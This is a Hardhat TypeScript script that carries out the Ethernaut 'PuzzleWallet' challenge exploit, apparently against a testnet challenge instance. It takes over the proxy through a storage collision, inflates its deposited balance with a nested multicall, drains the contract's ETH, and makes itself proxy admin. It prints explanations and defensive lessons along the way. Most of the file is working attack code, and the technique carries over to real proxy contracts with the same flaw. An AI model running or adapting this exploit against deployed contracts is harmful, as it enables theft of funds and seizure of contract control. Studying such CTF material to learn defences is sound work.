import { ethers } from "hardhat";

/**
 * Execute the PuzzleWallet exploit to hijack proxy admin via storage collision
 * 
 * Usage:
 *TARGET_ADDRESS=0xYourProxyAddress npx hardhat run scripts/level-24-puzzle-wallet/execute-puzzle-wallet-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing PuzzleWallet exploit...\n");
  
  // Get the addresses from environment
  const targetAddress = process.env.TARGET_ADDRESS;
  
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}\n`);
  
  try {
    // Connect to the contracts
    const proxy = await ethers.getContractAt("PuzzleProxy", targetAddress);
    const wallet = await ethers.getContractAt("PuzzleWallet", targetAddress);
    
    // Check initial state
    console.log("=== Initial State ===");
    const initialAdmin = await proxy.admin();
    const initialPendingAdmin = await proxy.pendingAdmin();
    const initialOwner = await wallet.owner();
    const initialMaxBalance = await wallet.maxBalance();
    const initialContractBalance = await ethers.provider.getBalance(targetAddress);
    const initialIsWhitelisted = await wallet.whitelisted(signer.address);
    
    console.log(`Proxy Admin: ${initialAdmin}`);
    console.log(`Pending Admin: ${initialPendingAdmin}`);
    console.log(`Wallet Owner: ${initialOwner}`);
    console.log(`Max Balance: ${ethers.formatEther(initialMaxBalance)} ETH`);
    console.log(`Contract Balance: ${ethers.formatEther(initialContractBalance)} ETH`);
    console.log(`Signer Whitelisted: ${initialIsWhitelisted}`);
    console.log(`Signer is Admin: ${initialAdmin === signer.address}`);
    
    if (initialAdmin === signer.address) {
      console.log("\n⚠️  You are already the admin! The exploit has already been executed.");
      return;
    }
    
    // Explain the vulnerability
    console.log("\n=== Vulnerability Explanation ===");
    console.log("This exploit leverages STORAGE COLLISION in the proxy pattern:");
    console.log("");
    console.log("Storage Layout:");
    console.log("  PuzzleProxy:");
    console.log("    Slot 0: pendingAdmin");
    console.log("    Slot 1: admin");
    console.log("");
    console.log("  PuzzleWallet:");
    console.log("    Slot 0: owner");
    console.log("    Slot 1: maxBalance");
    console.log("");
    console.log("Storage Collision:");
    console.log("  proxy.pendingAdmin == wallet.owner (both slot 0)");
    console.log("  proxy.admin == wallet.maxBalance (both slot 1)");
    console.log("");
    console.log("Attack Steps:");
    console.log("  1. Call proposeNewAdmin → become owner");
    console.log("  2. Whitelist ourselves");
    console.log("  3. Exploit multicall to inflate balance");
    console.log("  4. Drain contract to 0 balance");
    console.log("  5. Call setMaxBalance → become admin");
    
    // Execute the exploit step by step
    console.log("\n=== Executing Exploit ===");
    
    // Step 1: Become owner by exploiting storage collision
    console.log("\n✓ Step 1: Calling proposeNewAdmin to become owner...");
    const proposeTx = await proxy.proposeNewAdmin(signer.address);
    await proposeTx.wait();
    
    // Verify we're now the owner
    const newOwner = await wallet.owner();
    if (newOwner !== signer.address) {
      throw new Error(`Failed to become owner! Owner is: ${newOwner}`);
    }
    console.log(`  ✓ Success! We are now the owner: ${newOwner}`);
    
    // Step 2: Whitelist ourselves
    console.log("\n✓ Step 2: Whitelisting ourselves...");
    const whitelistTx = await wallet.addToWhitelist(signer.address);
    await whitelistTx.wait();
    
    const isWhitelisted = await wallet.whitelisted(signer.address);
    if (!isWhitelisted) {
      throw new Error("Failed to whitelist ourselves!");
    }
    console.log("  ✓ Success! We are now whitelisted");
    
    // Step 3: Inflate balance using nested multicall
    console.log("\n✓ Step 3: Inflating balance using multicall vulnerability...");
    
    const attackValue = ethers.parseEther("0.001");
    
    // Prepare the nested multicall
    // Inner multicall: just deposit
    const depositData = wallet.interface.encodeFunctionData("deposit");
    const innerMulticallData = wallet.interface.encodeFunctionData("multicall", [[depositData]]);
    
    // Outer multicall: deposit + nested multicall with deposit
    const multicallTx = await wallet.multicall([depositData, innerMulticallData], { value: attackValue });
    await multicallTx.wait();
    
    const ourBalance = await wallet.balances(signer.address);
    console.log(`  ✓ Success! Internal balance: ${ethers.formatEther(ourBalance)} ETH`);
    console.log(`  ✓ Contract balance: ${ethers.formatEther(await ethers.provider.getBalance(targetAddress))} ETH`);
    
    // Step 4: Drain the contract
    console.log("\n✓ Step 4: Draining contract balance...");
    const contractBalance = await ethers.provider.getBalance(targetAddress);
    const executeTx = await wallet.execute(signer.address, contractBalance, "0x");
    await executeTx.wait();
    
    const finalContractBalance = await ethers.provider.getBalance(targetAddress);
    if (finalContractBalance !== 0n) {
      throw new Error("Failed to drain contract!");
    }
    console.log("  ✓ Success! Contract drained, balance is now 0");
    
    // Step 5: Become admin by setting maxBalance
    console.log("\n✓ Step 5: Setting maxBalance to become admin...");
    const setMaxBalanceTx = await wallet.setMaxBalance(BigInt(signer.address));
    await setMaxBalanceTx.wait();
    
    console.log("  ✓ Success! setMaxBalance called");
    console.log("\n🎉 EXPLOIT COMPLETE! 🎉");
    
    
    // Check the final state
    console.log("\n=== Final State ===");
    const finalAdmin = await proxy.admin();
    const finalPendingAdmin = await proxy.pendingAdmin();
    const finalOwner = await wallet.owner();
    const finalMaxBalance = await wallet.maxBalance();
    const currentContractBalance = await ethers.provider.getBalance(targetAddress);
    const finalIsWhitelisted = await wallet.whitelisted(signer.address);
    
    console.log(`Proxy Admin: ${finalAdmin}`);
    console.log(`Pending Admin: ${finalPendingAdmin}`);
    console.log(`Wallet Owner: ${finalOwner}`);
    console.log(`Max Balance: ${ethers.formatEther(finalMaxBalance)} ETH (uint160 of admin address)`);
    console.log(`Contract Balance: ${ethers.formatEther(currentContractBalance)} ETH`);
    console.log(`Signer Whitelisted: ${finalIsWhitelisted}`);
    console.log(`Signer is Admin: ${finalAdmin === signer.address}`);
    
    // Verify the exploit was successful
    if (finalAdmin === signer.address) {
      console.log("\n✅ SUCCESS! You are now the admin of the proxy!");
      
      console.log("\n📋 How the exploit worked:");
      console.log("");
      console.log("Step 1: Storage Collision to become owner");
      console.log("  • Called proxy.proposeNewAdmin(ourAddress)");
      console.log("  • This set pendingAdmin (slot 0) = ourAddress");
      console.log("  • Due to storage collision, owner (slot 0) = ourAddress");
      console.log("  • Result: We became the wallet owner!");
      console.log("");
      console.log("Step 2: Whitelisted ourselves");
      console.log("  • As owner, called wallet.addToWhitelist(ourAddress)");
      console.log("  • Now we can call wallet functions");
      console.log("");
      console.log("Step 3: Inflated balance via multicall vulnerability");
      console.log("  • multicall uses delegatecall (preserves msg.value)");
      console.log("  • Called: multicall([deposit, multicall([deposit])])");
      console.log("  • First deposit: credited msg.value");
      console.log("  • Nested multicall: NEW context, can call deposit again!");
      console.log("  • Second deposit: credited msg.value AGAIN");
      console.log(`  • Result: Balance = ${ethers.formatEther(attackValue * 2n)} but only sent ${ethers.formatEther(attackValue)}`);
      console.log("");
      console.log("Step 4: Drained the contract");
      console.log("  • Used execute() to withdraw all real balance");
      console.log("  • Contract balance became 0");
      console.log("");
      console.log("Step 5: Storage Collision to become admin");
      console.log("  • Called wallet.setMaxBalance(ourAddress)");
      console.log("  • This set maxBalance (slot 1) = ourAddress");
      console.log("  • Due to storage collision, admin (slot 1) = ourAddress");
      console.log("  • Result: We became the proxy admin!");
      
      console.log("\n⚠️  Key Lessons:");
      console.log("  1. Proxy and implementation MUST have matching storage layouts");
      console.log("  2. Use OpenZeppelin's upgradeable contracts pattern");
      console.log("  3. delegatecall preserves msg.value - be careful with reuse");
      console.log("  4. Nested delegatecalls create new execution contexts");
      console.log("  5. Always validate state in batched operations");
      
    } else {
      console.log("\n❌ FAILED! The exploit didn't work as expected.");
      console.log("Possible reasons:");
      console.log("  • Contract has different implementation");
      console.log("  • Insufficient ETH sent");
      console.log("  • Contract already has modifications");
      console.log("  • Network conditions");
    }
    
  } catch (error) {
    console.error("\n❌ Error executing PuzzleWallet exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
